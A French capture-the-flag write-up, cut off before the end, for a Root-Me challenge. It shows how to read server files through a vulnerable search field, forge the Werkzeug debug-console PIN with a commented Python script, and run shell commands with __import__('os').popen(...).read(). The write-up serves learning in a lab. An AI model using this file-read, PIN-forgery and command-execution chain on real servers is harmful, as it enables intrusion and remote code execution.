
Pour ce challenge il faudra récupérer le flag qui se situe dans le répertoire web de l'application :

![](../img/Pasted%20image%2020260425155602.png)

Voyons voir à quoi ressemble le site web : 

![](../img/Pasted%20image%2020260425155628.png)


Cliquons sur "Nos services" (Our services) : 

![](../img/Pasted%20image%2020260425155851.png)

On arrive sur une page qui n'est pas totalement fonctionnel soit disant leurs services  de recherches de d'autres services n'est pas totalement fonctionnel. Essayons de chercher quelques chose comme "test". 

![](../img/Pasted%20image%2020260425155957.png)

Bizarre, il essaye de chercher un fichier ou de l'ouvrir, essayons de rentrer dans le répertoire racine de la machine : 

![](../img/Pasted%20image%2020260425160055.png)

Okay donc il ne rentre pas dans un fichier peut-être qu'il exécute un "cat" ou autre, pour en avoir le coeur net essayons lire le fichier /etc/passwd en tapant dans l'input /etc/passwd : 

![](../img/Pasted%20image%2020260425160219.png)

Bingo ! On voit à la toute fin qu'il y a un utilisateur linux qui s'appel web-app car il détient un dossier utilisateur (/home) donc la suite est le nom de l'utilisateur, ici qui est web-app. On à déjà un utilisateur :)

Maintenant essayons de voir qu'elle interface réseaux dispose ce serveur, vos mieux prendre un max d'information sur le serveur pour cela on va lire le fichier /proc/net/arp qui contient tout les processus arp de cette machine : 

![](../img/Pasted%20image%2020260425160550.png)

Ici on voit que l'interfaces réseau utiliser de la machine est le "eth0"

Essayons de récupérer l'adresse mac dans le fichier /sys/class/net/eth0/address : 

![](../img/Pasted%20image%2020260425161404.png)

Okay parfait, maintenant essayons de voir qu'elle environnement web est utiliser. Pour cela on va visiter le fichier /proc/self/environ(au passage /proc est souvent le dossier des interfaces virtuelle vers les informations du noyau des processus. Le /self est le processus actuel (celui qui lit le fichier et le /environ est désigner pour les variables d'environnement )) : 

![](../img/Pasted%20image%2020260425161459.png)

On voit que le serveur utilise WERKZEUG essayons d'aller voir leurs documentation : 

https://werkzeug.palletsprojects.com/en/stable/tutorial/

Voici l'utilisation de base de werkzeug et comment il marche. Mais pour l'instant voyons voir d'autre fichier qui peuvent être intéressant.

Voyons voir le stockage des adresses mémoire des différents processus dans /proc/self/maps : 

![](../img/Pasted%20image%2020260425163715.png)

On peut voir que lorsqu'on trie en faisant CTRL + F et qu'on cherche "web-app" on trouve beaucoup de correspondance avec /home/web-app/.local/lib/python3.11/site-packages/

Avant de récupérer le chemin complet du processus qui est exécuté on va aller regarder qu'elle fichier à eu une commande d'exécution pour cela on va visité le fichier suivant(/proc/self/cmdline ) : 
![](../img/Pasted%20image%2020260425170259.png)
Okay le processus s'appel app.py on aura donc quelques chose de la forme : 
/home/web-app/.local/lib/python3.11/site-packages/[dependance]/app.py
dans ce que j'appel dépendance je parle notamment de ce qui est dans un requirements.txt basic. 

Pour cela il faut savoir que le requirements.txt ce trouve forcément quelques part dans le répertoire du processus actif. Comme je vous l'ai dis /proc est le dossier des interfaces virtuelle vers les informations du processus. /self est le processus actif donc ici app.py et cwd (**C**urrent **W**orking **D**irectory) est le répertoire dans lequel notre processus est entrain de tourner actuellement, c'est un symlinks (lien symbolique) important puisqu'il nous enverra toujours dans le dossier du processus actuelle puis que le principe d'un lien symbolique je vous le rappel est de renvoyer vers un autre dossier ou fichier.

Ici /proc/self/cwd va forcément nous renvoyer sur le répertoire du processus il suffira de taper /requirements.txt pour voir les dépendances de l'application. 

![](../img/Pasted%20image%2020260425171914.png)

Okay parfait on voit dans les dépendances donc qu'il y a notre Werkzeug qu'on avait trouver, mais aussi maintenant on voit quelques choses qui nous ai familier qui est Flask. 

Essayons de voir ce que nous renvoie si on lit le fichier donc qui je rappel été /home/web-app/.local/lib/python3.11/site-packages/[dependance]/app.py

ici on va remplacer dependance par flask. 

![](../img/Pasted%20image%2020260425172148.png)


Okay on voit que c'est bien flask qui est utiliser. Mais avant tout, il y a beaucoup trop d'information nan ? Essayons de rejouer avec notre symlink(liens symboliques) pour voir ce que contient notre fichier app.py directement. Car la c'est plein de choses qui sont regrouper mais pas forcément le plus important. 

On va donc taper : 

/proc/self/cwd/app.py 

![](../img/Pasted%20image%2020260425172323.png)
Okay Bingo ! on voit tout en bas qu'une option de debug qui est utiliser(True) sur notre serveur web donc il y a une shell de debug du serveur web. Mais comment connaitre le endpoint de ce shell de Werkzeug ? Tout simplement on appel notre ami internet :)

![](../img/Pasted%20image%2020260425172522.png)

Bingo cherchons la de dans. 

![](../img/Pasted%20image%2020260425172543.png)

Tiens bingo il y a un danger qui est marquer. Il ne faut pas activer le debug sur des machines en productions... Pas pro tout cela.

Bon continuons essayons de voir ou ce situe cette console de debug : 

![](../img/Pasted%20image%2020260425172910.png)

Essayons de voir s'il est bien actif sur notre site pour cela je vais taper l'url suivante : 

challenge01.root-me.org:59085/console
![](../img/Pasted%20image%2020260425173423.png)

(à noter que je suis sous un navigateur privé puisque j'avais déjà fais le challenge mes cookies été relier et skipper l'étape la plus importante qui est le crackage du pin de la console.)

Mince il va falloir craquer le pin. Mais comment est constituer le pin de Werkzeug ? 

Il est constituer de plusieurs choses, il n'est pas choisis aléatoirement ou par l'administrateur mais plutôt par les informations qui sont mises dans les différents fichier. Je vous ai fait lire plusieurs fichier puisqu'on avait besoin pour la suite vous allez vite le voir. Pour bypass le pin on peut utiliser le script suivant que j'ai commentais : 

```python
import hashlib

from itertools import chain

  

def main() :

    mac = int("02 42 ac 10 00 2a".replace(" ", ""), 16) #Trouver dans le fichier /proc/net/arp l'interface réseau utiliser puis aller dans /sys/class/net/[nom_de_votre_interface]/address ici le ,16 permet de convertir directement de l'hexa à décimale et .replace permet de remplacer les caractères " " par des caractères vides "".

  
  

    public_bits = [

        'web-app', #Le nom de l'utilisateur que vous pouvez retrouver dans /etc/passwd ou /proc/sys/environ par exemple ici j'ai /home/web-app je sais que c'est un utilisateur qui contient un répertoire utilisateur par le /home juste avant donc l'utilisateur est web-app

        'flask.app', #modname par défaut car on à /flask/app.py donc on à le nom flask.app grossomodo. 

        'Flask', # getattr(app '__name__', getattr(app.__class__, '__name__')) Le nom par défaut aussi pour flask

        '/home/web-app/.local/lib/python3.11/site-packages/flask/app.py' #getattr(mod ,'__file__',None),

  

    ]

  

    private_bits = [

        str(mac), #Je rappel ma variable mais ici on va travailler en str donc je transforme mon instance int en instance str

        'f6a43d31-5709-47e5-a76f-205dcff3130f' #Trouver dans /proc/sys/kernel/random/boot_id

  

    ]

  

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0

    hash = hashlib.sha1()

    for bit in chain(public_bits, private_bits): #Ici je concatène mes deux listes ce qui veut dire que les données publiques seront reliers au donnés privé

        if not bit: #Si le bit est vide (None) on continue

            continue

        if isinstance(bit, str): #Si mon bit est de instance strings alors je le transforme en bit

            bit = bit.encode('utf-8')

        hash.update(bit)

    hash.update(b'cookiesalt') #Le b devant signifie(bytes) et on ajoute le salt au hash sha1

    # h.update(b'shittysalt')

  

    cookie_name = '__wzd' + hash.hexdigest()[:20] #__wzd est le début des cookies WerkZeug Debug que vous pouvez trouver  hash.hexdigest va permetre de hasher en hexadecimal (string) et le [:20 on ne prend que les 20 premier caractère] exemple : __wzdabc123456789...

  

    num = None

    if num is None: #Si num n'est pas définie :

        hash.update(b'pinsalt') #On ajoute un autre salt ici c'est le salt du pin

        num = ('%09d' % int(hash.hexdigest(), 16))[:9] #hash.hexdigest (hash en hexa) ,int(... , 16) convertie en entier , %09d formate avec 9 chiffres minimum. [:9] garde seulement 9 chiffres

  

    rv = None

    if rv is None:

        for group_size in 5, 4, 3: #On découpe en groupe de 5 chiffres, 4 ou 3 ce qui donne soit 12345-67890 ou 1234-5678-9 ou soit 123-456-789

            if len(num) % group_size == 0: #Si la taille du numéro diviser par le groupe donc en 5 en 4 ou en 3 le reste est 0 alors on forme notre pin

                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')

                            for x in range(0, len(num), group_size))

                break

        else:

            rv = num

  

    print(rv)

  

if __name__ == "__main__" :

    main()
```


J'ai expliquer la plus part du code et où on trouve les différentes informations qui faut. Dans les données que l'ont à déjà vu. Pour les informations privés je vais vous montrer où les cherchés. 

L'adresse Mac il suffit d'aller voir les informations enregistrer sur le processus arp. On va aller voir /proc/net/arp : 

![](../img/Pasted%20image%2020260425174858.png)
Ici on voit notre interface. Maintenant nous allons récupérer l'adresses relier à cette interface qui est eth0 pour cela on va aller voir le fichier : /sys/class/net/eth0/address

![](../img/Pasted%20image%2020260425175048.png)

Okay parfait. 

Remplacer les informations par celle que vous avez. Maintenant je vais lancer mon script : 

![](../img/Pasted%20image%2020260425175203.png)
![](../img/Pasted%20image%2020260425175211.png)

Résultat du crackage du pin : 571-988-375
Maintenant voyons voir si on à pris les bonnes informations en testant notre pin sur l'endpoint /console pour avoir accès à la console

![](../img/Pasted%20image%2020260425175400.png)

Moment de vérité : 

![](../img/Pasted%20image%2020260425175417.png)

Bingo ! 


Maintenant il faut savoir que le debugger de Werkzeug utilise des commandes via python il n'est donc pas possible de taper comme de rien n'était cat ou ls -la par exemple, preuve de ce que j'avance : 

![](../img/Pasted%20image%2020260425175533.png)


Il faut pour cela on va utiliser le module (os) et on va l'importer dans notre shell sur la commande, car oui si vous voulez comme au début avec moi utiliser os.system() qui est censé quand même vous renvoyer une information celui-ci vous renverras juste que la commande c'est bien passer avec un "0" mais ne vous renverras pas l'informations de qui vous êtes. 

Démonstration : 

je vais taper la choses suivante dans mon shell : 

```shell
__import__("os").system("whoami")
```
Je rappel que puisque c'est un shell et qu'on veut importer le module os on ne vas pas taper comme du script normal donc import os mais avec la syntaxe juste au dessus. 
```python
import = __import__
```

Les deux fons la même choses mais ne sont pas utiliser dans le même contexte. 
Le script que j'ai taper en une ligne reviens à taper la chose suivante : 

```python
import os 

os.system("whoami")
```

Ceci va donc me dire qui je suis nan ? Et bein nan si vous vous rappelez de ce que je vous ai dis ici cela va nous renvoyer que 0 preuve : 

![](../img/Pasted%20image%2020260425180132.png)

la commande c'est bien exécuté mais elle nous renvoie pas ce qu'on veut. 

Donc on va utiliser quelque choses d'autre que .system 

On va utiliser popen() qui permet d'exécuter une commande shell et d'en renvoyer sont adresses mémoire où est stocker le résultat. 
https://docs.python.org/fr/3/library/os.html

![](../img/Pasted%20image%2020260425181112.png)


Mais si on essaye de le faire bêtement comme cela, nous aurons une réponse de type 

```shell
<os._wrap_close object at [adresse de la mémoire où est stocker la commande]>
```

C'est pour cela que l'ont va utiliser l'option read() du module os.
L'option read() permet de récupérer directement les informations stocker dans une adresse mémoire (ici qui sera l'adresse mémoire renvoyer par la commande popen() qui je vous rappel renvoie une l'adresse mémoire où est stocker le résultat de la commande) donc en combinant les deux on obtient une commande comme : 
```python
__import__("os").popen("whoami").read()
```

Preuve de ce que j'avancer sur l'importance du .read() : 

![](../img/Pasted%20image%2020260425180458.png)

Bon pourquoi on ne peux pas combiner read() avec .system par exemple ? Tout simplement car celui-ci ne figure pas dans les commandes compatible avec read() : 

![](../img/Pasted%20image%2020260425181919.png)

Comme vous pouvez le voir ici, il est compatible directement avec popen() ce qu'on vient d'utiliser. 

Mais pourquoi cela renvoie un 0 ou un 1 pour l'option .system? 

Simplement car lorsque os.system("whoami") est utiliser de base sans être rentrer dans une variable, il renvoie l'information de la commande. Or ici vu ce qui nous à été retourner on sais que le debugger met notre commande dans une variable. Puisque lorsque celui-ci est bien exécuté (je parle du os.system()) retourne bien une valeur soit 0 soit 1 donc on ne peut pas affichier le retour, la manière la plus simple et de faire via popen().read comme je vous l'ai montrer.
Bon maintenant que je vous ai appris des trucs (plus ou moins je l'espère :) ) passons à notre commande finale, nous utiliserons la suivante donc : 

```python
__import__("os").popen("notre commande").read()
```

ce qui revient exactement à 

```python
import os 
x = os.popen("notre commande") #on a vu que le serveur mettez dans une variable notre input il détient donc l'adresse du retour par exemple 0x .... 


```